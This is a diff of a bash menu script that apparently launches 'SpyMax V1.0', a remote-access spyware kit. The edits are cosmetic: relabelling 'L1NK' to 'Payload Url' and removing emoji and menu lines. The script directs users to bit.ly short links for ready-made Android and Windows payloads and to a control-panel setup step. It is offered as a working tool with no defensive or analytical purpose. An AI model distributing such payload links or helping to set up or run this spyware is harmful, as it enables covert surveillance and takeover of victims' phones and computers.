@@ -127,7 +127,7 @@ echo " "
 echo -e "\e[91m   First set up the control panel. Return and set up Administration Control Option: 4
                                
 
-         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+         \e[92mPayload Url :- \e[96mhttps://bit.ly/3ild93L\e[91m
 
 You are selected android payload . Payload Is Ready :D."
 echo
@@ -151,12 +151,12 @@ echo -e '\e[92m
                        ▀▄▀▄▀ █ █░▀█ █▄▀ █▄█ ▀▄▀▄▀ ▄█ '
 echo " "
 echo " "
-echo -e "\e[93m  First set up the control panel. Return and set up Administration Control Option: 5
-                    👇👇👇
+echo -e "\e[93mFirst set up the control panel. Return and set up Administration Control Option: 5
+                   
 
-        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+        \e[92mPayload Url :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
 
-                    👆👆👆
+                    
 You are selected windows payload . Payload Is Ready :D.."
 echo
 echo -ne "\e[92m#Type exit : "
@@ -234,15 +234,9 @@ fi
 pop(){
 clear
 echo -e "\e[96m                                                    \e[0m"
-echo -e "\e[96m                             \e[93mRUN, SPYMAX V1.0\e[96m   \e[0m"
-echo -e "\e[96m                                                    \e[0m"
-echo -e "\e[96m                                                     \e[0m"
-echo -e "\e[96m                         TYPE \e[92mspanel\e[96m to DOWNLOAD CONTROL PANEL \e[96m           \e[0m"
-echo -e "\e[96m                                 (\e[93m+\e[96m)               \e[96m \e[0m"
+echo -e "\e[96m                             \e[93mRUN, SPYMAX V1.0\e[96m   \e[0m"                                                    
 echo -e "\e[96m                         TYPE \e[91mactive\e[96m to RUN SPYMAX \e[96m          \e[0m"
-echo -e "\e[96m                                 (\e[93m+\e[96m)               \e[96m \e[0m"
-echo -e "\e[96m                         Type \e[91mskip\e[96m to SKIPFOREVER\e[96m        \e[0m"
-echo -e "\e[96m                                                     \e[0m"
+echo -e "\e[96m                                 (\e[93m+\e[96m)               \e[96m \e[0m"                                                    
 echo -en "\e[32mType [\e[93mspanel/\e[93mactive/\e[32m\e[93mskip\e[32m]: \e[0m "
 read p
 if [ "$p" = "setupcontrol" ];
